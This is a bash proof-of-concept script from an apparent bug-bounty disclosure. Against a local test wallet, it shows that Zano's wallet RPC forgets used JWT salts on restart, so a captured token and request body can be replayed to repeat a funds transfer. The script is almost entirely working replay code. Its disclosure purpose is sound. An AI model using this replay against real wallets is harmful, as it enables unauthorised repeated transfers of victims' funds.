#!/usr/bin/env bash
# PoC for Zano wallet-RPC JWT replay-after-restart (Immunefi #49383).
#
# The wallet RPC tracks consumed JWT salts only in memory (m_jwt_used_salts). After a restart
# the salt history is empty, so a previously-used, still-unexpired token + its exact body can be
# replayed to re-execute an authenticated command (e.g. transfer).
#
# Requires: simplewallet built from source, a funded test wallet, jq, and a small HS256 signer.
set -euo pipefail

SECRET="mysupersecret"
RPC="http://127.0.0.1:8080/json_rpc"

start_wallet() {
  ./simplewallet --wallet-file mywallet --password testpass \
    --rpc-bind-ip 127.0.0.1 --rpc-bind-port 8080 --jwt-secret "$SECRET" &
  sleep 3
}

# 1) Request body we want to (re)execute.
cat > transfer.json <<'JSON'
{
  "jsonrpc": "2.0",
  "id": "1",
  "method": "transfer",
  "params": {
    "destinations": [
      { "address": "ZxKViDbnT7dPyEBrvFtKw6fARuBkFYUhzqHFfQmxXYGASpTHwAbeEBK8ebRm2J7RHzLwG8YN9UuGATTVWXB5m2PV3pmFZUmzS",
        "amount": 1000000000 }
    ],
    "fee": 100000000,
    "mixin": 3
  }
}
JSON

# 2) Hash the body exactly as the server does.
BODY_HASH="$(tr -d '\n' < transfer.json | sha256sum | awk '{print $1}')"

# 3) Mint an HS256 JWT: header + payload{exp, salt, body_hash}, signed with SECRET.
b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD="{\"exp\":1954896000,\"salt\":\"replay-001\",\"body_hash\":\"${BODY_HASH}\"}"
H="$(printf '%s' "$HEADER"  | b64url)"
P="$(printf '%s' "$PAYLOAD" | b64url)"
SIG="$(printf '%s' "${H}.${P}" | openssl dgst -sha256 -hmac "$SECRET" -binary | b64url)"
TOKEN="${H}.${P}.${SIG}"

send() {
  curl -s -X POST "$RPC" \
    -H "Content-Type: application/json" \
    -H "Zano-Access-Token: ${TOKEN}" \
    --data @transfer.json
  echo
}

# 4) First (legitimate) execution.
start_wallet
echo "[*] Original request:"; send

# 5) Restart with the SAME secret — in-memory salt history is wiped.
pkill simplewallet; sleep 2
start_wallet

# 6) Replay the identical token + body. Expected: accepted again (transfer re-executes).
echo "[*] Replayed request after restart:"; send
